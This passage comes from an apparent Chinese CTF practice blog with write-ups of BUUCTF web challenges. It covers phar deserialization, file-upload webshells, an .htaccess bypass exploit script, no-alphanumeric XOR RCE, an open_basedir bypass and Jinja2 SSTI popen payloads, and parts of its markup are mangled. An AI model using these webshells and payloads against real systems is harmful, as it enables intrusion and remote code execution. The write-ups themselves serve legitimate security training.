&lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>我们是无法利用文件读取来读取flag的。class.php一看就是反序列化，但是所有的代码里面都没有unserialize方法。有文件上传点，且phar协议没有过滤，那么就应该考察的是利用phar协议来进行反序列化逃逸，那我们就要尝试来构造poc链。</p><p>首先确定终点，它应该是可以读取文件的一个方法，我们锁定file_get方法</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>我们就可以向这个方法中传入我们需要读取的文件路径就可以了。</p><p>思路:</p><pre><code>对象销毁，调用__destruct()方法，最后会echo一个值，令$C1e4r-&gt;str=$Show,这样就会调用show对象的__toString()方法，再令$Show-&gt;str[&#39;str&#39;]=$Test,test对象中并没有source，所以会调用get方法，令Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,就可以成功读取flag</code></pre><p>poc链</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>在本地搭建php环境，然后访问，会生成一个phar文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>接下来要把这个文件上传到目标服务器，但是只允许图片进行上传</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>所以我们把后缀改为.gif，这并不会影响phar文件的解析</p><p>接下来要得到我们上传文件的路径</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>对文件名和远程地址进行md5加密，后缀加上jpg，由此得到文件名</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpg路径为:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单文件上传，进去后注册账号，登录。</p><p>可以直接上传PHP文件</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>然后复制图片链接，到蚁剑中连接</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>查看源代码</p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #body获取post数据,后面会对这进行$json = json_decode($body, true); #对获取得数据进行解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #判断body是否有效，是否存在json数据，是否存在json[&#39;page&#39;]数据   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #读取page中得内容  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#匹配过滤关键字ctfecho json_encode([&#39;content&#39; =&gt; $content]); #将content进行json编码并输出</code></pre><p>在json中，字符Unicode编码之后等同于该字符，比如php等同于\u0070\u0068\u0070。</p><p>构造payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>编码下</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>解码</p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>代码审计</p><p><code>$a ?? 0 等同于 isset($a) ? $a : 0。</code></p><p>首先爆出路径</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><pre><code>过滤了空格‘ ’可以用 \t或者%09(需要php环境) 代替</code></pre><p>构造payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>代码审计</p><p>源码贴上来：</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctf刷题-第一周题目/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)成功出来phpinfo，看一看有没有可以利用的点[![image-20220210152650640](ctf刷题-第一周题目/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)发现执行系统的命令全被禁用了，看来rce走不通了。这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了[![image-20220210152821670](ctf刷题-第一周题目/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。既然rce走不通，那就试一试文件上传吧[![image-20220210152933281](ctf刷题-第一周题目/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。但是上传.htaccess仍然有[![image-20220210204915083](ctf刷题-第一周题目/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)这个函数限制。解决这个函数，采用xbm格式，X Bit Map```在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。所以我们在.htaccess里加上```#define width 1337#define height 1337..........```就可以绕过绕过这个函数了。上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对<?进行了检测。这里有两种方法可以绕过。1、对一句话木马的内容进行base64编码。2、使用 utf-16be 来绕过下面先附上两种方法的exp：1、```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```本题php环境为7.2，所以无法使用`<script language="php">eval($_REQUEST['shell']);</script>`这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。得到[![image-20220210212049717](ctf刷题-第一周题目/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2、```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```同理上传即可[![image-20220210212639842](ctf刷题-第一周题目/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)一句话木马成功利用。使用蚁剑成功连接[![image-20220210212824536](ctf刷题-第一周题目/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)但是无法访问根目录。非预期解：采用蚁剑自带插件进行绕过.[![image-20220210213427872](ctf刷题-第一周题目/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)预期解：绕过open_basedir这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctf刷题-第一周题目/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)所有文件被列举出来了，下面读取flag值就可以了。[![image-20220210214447849](ctf刷题-第一周题目/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 这道题是模板注入。 [![image-20220211102608147](ctf刷题-第一周题目 image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) 首先查看源代码，并没有什么用。 [![image-20220211102910418](ctf刷题-第一周题目 image-20220211102910418.png)](https: image-20220211102910418.png) dirsearch爆破一下，什么也没有。 [![image-20220211102929099](ctf刷题-第一周题目 image-20220211102929099.png)](https: image-20220211102929099.png) 本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。 我们这里采用arjun工具进行爆破。工具链接：https: github.com s0md3v arjun [![image-20220211110028885](ctf刷题-第一周题目 image-20220211110028885.png)](https: image-20220211110028885.png)最终可爆破出来参数name。 [![image-20220211105238512](ctf刷题-第一周题目 image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctf刷题-第一周题目 image-20220211105250064.png)](https: image-20220211105250064.png) 测试了一下的确存在模板注入。 接下来就是对漏洞的利用。 **漏洞利用** **1、工具tplmap** [![image-20220211110242684](ctf刷题-第一周题目 image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctf刷题-第一周题目 image-20220211110254561.png)](https: image-20220211110254561.png) 成功，发现为jinja2模板，在ctf题目中经常考察 直接–os-shell拿下shell，读取flag [![image-20220211110436293](ctf刷题-第一周题目 image-20220211110436293.png)](https: image-20220211110436293.png) **2、手工利用** 只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。 具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。 [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flak框架 ) 首先给几个比较通用的payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctf刷题-第一周题目 image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __   是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins   __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__   builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>同理，可以利用的类还有很多啊，</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" 